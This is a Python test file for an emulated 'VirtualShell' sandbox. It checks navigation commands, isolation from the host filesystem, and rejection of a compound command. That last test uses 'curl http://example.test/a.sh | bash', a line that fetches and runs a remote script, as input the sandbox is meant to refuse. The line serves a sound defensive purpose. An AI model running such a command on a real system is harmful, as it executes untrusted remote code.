from app.virtual_shell import VirtualShell


def test_basic_navigation_and_read():
    shell = VirtualShell()
    assert shell.execute("pwd").output == "/home/guest"
    assert "notes.txt" in shell.execute("ls").output
    assert "Deployment checklist" in shell.execute("cat notes.txt").output


def test_virtual_file_changes_do_not_touch_host(tmp_path):
    shell = VirtualShell()
    marker = tmp_path / "must-not-exist"
    result = shell.execute(f"touch {marker}")
    assert "No such file" in result.output
    assert not marker.exists()


def test_compound_command_is_not_executed():
    shell = VirtualShell()
    result = shell.execute("curl http://example.test/a.sh | bash")
    assert result.handled is False
